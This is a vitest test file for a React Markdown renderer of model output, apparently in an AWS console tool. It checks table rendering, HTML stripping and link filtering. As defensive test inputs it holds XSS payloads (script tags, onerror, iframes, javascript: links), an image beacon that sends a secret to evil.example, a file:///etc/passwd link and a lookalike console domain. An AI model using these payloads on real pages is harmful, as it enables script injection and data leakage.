import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { Markdown, safeHref } from './Markdown'

const render = (text: string): string => renderToStaticMarkup(<Markdown text={text} onLink={() => {}} />)
const volumeTable = '| 项目 | 影响 |\n| --- | --- |\n| 实例状态 | 修改实例类型前需停止实例，当前状态应重新查询 |\n| EBS 卷 | 卷的修改状态为 `optimizing` 时仍可继续读写 |\n| IP 地址 | 停止并启动后公网 IP 可能改变 |\n| 实例存储 | 停止实例会丢失 instance-store 数据 |\n| 费用 | `m7i.large` 与 `m7i.xlarge` 的小时价格不同 |\n| 容量 | 指定 AZ 可能发生 `InsufficientInstanceCapacity` |'
const wideTable = '| A | B | C | D | E | F | G | H |\n| - | - | - | - | - | - | - | - |\n| `optimizing` | 一 | 二 | 三 | 四 | 五 | 六 | `InsufficientInstanceCapacity` |'

describe('Markdown (model output)', () => {
  it('renders ordinary markdown, including GFM tables', () => {
    const html = render('**粗体** `code`\n\n| a | b |\n| - | - |\n| 1 | 2 |')
    expect(html).toContain('<strong>粗体</strong>')
    expect(html).toContain('<code>code</code>')
    expect(html).toContain('<table>')
  })

  it('renders narrow and eight-column tables inside a contained table viewport without clipping cell text', () => {
    for (const [text, cells] of [[volumeTable, 14], [wideTable, 16]] as const) {
      const html = render(text)
      expect(html).toContain('<div class="md-table">')
      expect(html.match(/<(?:th|td)\b/g)).toHaveLength(cells)
      expect(html).toContain('InsufficientInstanceCapacity')
    }
    expect(render(volumeTable)).toContain('<code>optimizing</code>')
  })

  it('drops raw HTML instead of rendering it', () => {
    const html = render('hi <script>alert(1)</script> <img src="https://evil.example/x.png" onerror="alert(1)"> <iframe src="https://evil.example"></iframe>')
    expect(html).not.toMatch(/<script|<img|<iframe|onerror/)
  })

  it('renders no images, so nothing can beacon out', () => {
    expect(render('![x](https://evil.example/track.png?d=secret)')).not.toContain('<img')
  })

  it('keeps only web links clickable', () => {
    const html = render('[console](https://ap-northeast-1.console.aws.amazon.com/ec2/home) [js](javascript:alert(1)) [file](file:///etc/passwd) [data](data:text/html,<b>x</b>)')
    expect(html).toContain('href="https://ap-northeast-1.console.aws.amazon.com/ec2/home"')
    expect(html).not.toMatch(/javascript:|file:|data:/)
    expect(html.match(/<a /g)).toHaveLength(1)
  })

  it('in cards, keeps only console links clickable and still drops HTML and images', () => {
    const html = renderToStaticMarkup(
      <Markdown
        consoleOnly
        onLink={() => {}}
        text={'[console](https://us-east-1.console.aws.amazon.com/billing/home) [web](https://evil.example/?d=1) [js](javascript:alert(1)) <script>alert(1)</script> ![x](https://evil.example/t.png)'}
      />
    )
    expect(html.match(/<a /g)).toHaveLength(1)
    expect(html).toContain('href="https://us-east-1.console.aws.amazon.com/billing/home"')
    expect(html).not.toMatch(/evil\.example|javascript:|<script|<img/)
    expect(safeHref('https://console.aws.amazon.com.evil.example/', true)).toBeNull()
  })

  it('safeHref accepts http(s) only', () => {
    expect(safeHref('https://example.com')).toBe('https://example.com')
    expect(safeHref('mailto:a@b.c')).toBeNull()
    expect(safeHref('/relative')).toBeNull()
    expect(safeHref(undefined)).toBeNull()
  })
})
